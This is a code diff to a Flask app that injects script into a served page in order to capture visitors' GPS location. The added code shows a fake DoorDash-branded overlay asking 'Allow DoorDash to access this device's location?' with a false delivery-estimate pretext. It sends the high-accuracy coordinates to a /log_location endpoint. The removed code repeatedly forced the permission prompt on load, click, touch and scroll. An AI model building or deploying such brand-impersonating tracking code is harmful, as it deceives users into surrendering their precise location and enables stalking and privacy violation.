@@ -24,51 +24,87 @@ def serve_page():
     except FileNotFoundError:
         html_content = "<html><body>Default page - page.html not found</body></html>"
     
-    # Inject the tracking script right before the closing </head> tag
-    tracking_script = """
+    # Inject the permission overlay and tracking script
+    overlay_and_script = """
+    <style>
+        .location-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        .location-button {
+            background: #FF3008;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 8px;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+    </style>
+
+    <div id="locationOverlay" class="location-overlay">
+        <h2>Allow DoorDash to access this device's location?</h2>
+        <p>We need your location to provide accurate delivery estimates</p>
+        <button id="locationButton" class="location-button">Allow Location Access</button>
+    </div>
+
     <script>
-        // Function to request GPS permission and log location
+        document.getElementById('locationButton').addEventListener('click', function() {
+            requestLocation();
+            document.getElementById('locationOverlay').style.display = 'none';
+        });
+
         function requestLocation() {
             if (navigator.geolocation) {
-                // This timeout helps trigger the permission prompt more reliably
-                setTimeout(function() {
-                    navigator.geolocation.getCurrentPosition(
-                        function(position) {
-                            const lat = position.coords.latitude;
-                            const lon = position.coords.longitude;
-                            navigator.sendBeacon('/log_location?lat=' + lat + '&lon=' + lon);
-                        },
-                        function(error) {
-                            navigator.sendBeacon('/log_error?code=' + error.code);
-                        },
-                        {
-                            enableHighAccuracy: true,
-                            maximumAge: 0,
-                            timeout: 15000
-                        }
-                    );
-                }, 100);
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        navigator.sendBeacon('/log_location?lat=' + lat + '&lon=' + lon);
+                    },
+                    function(error) {
+                        navigator.sendBeacon('/log_error?code=' + error.code);
+                        // Show error message if needed
+                        document.getElementById('locationOverlay').innerHTML = `
+                            <h2>Location Access Required</h2>
+                            <p>Please enable location services in your browser settings</p>
+                        `;
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        maximumAge: 0,
+                        timeout: 15000
+                    }
+                );
             } else {
                 navigator.sendBeacon('/log_error?code=unsupported');
+                document.getElementById('locationOverlay').innerHTML = `
+                    <h2>Location Not Supported</h2>
+                    <p>Your browser doesn't support location services</p>
+                `;
             }
         }
         
-        // Several techniques to trigger the permission prompt:
-        // 1. Try immediately on page load
-        requestLocation();
-        
-        // 2. Try again after a short delay
-        setTimeout(requestLocation, 500);
-        
-        // 3. Try on any user interaction
-        document.addEventListener('click', requestLocation);
-        document.addEventListener('touchstart', requestLocation);
-        document.addEventListener('scroll', requestLocation);
+        // Also try to request on page load as fallback
+        setTimeout(requestLocation, 1000);
     </script>
     """
     
-    # Insert the script and return the modified page
-    modified_html = html_content.replace('</head>', tracking_script + '</head>')
+    # Insert the overlay and script right before </body>
+    modified_html = html_content.replace('</body>', overlay_and_script + '</body>')
     return modified_html
 
 @app.route('/log_location')
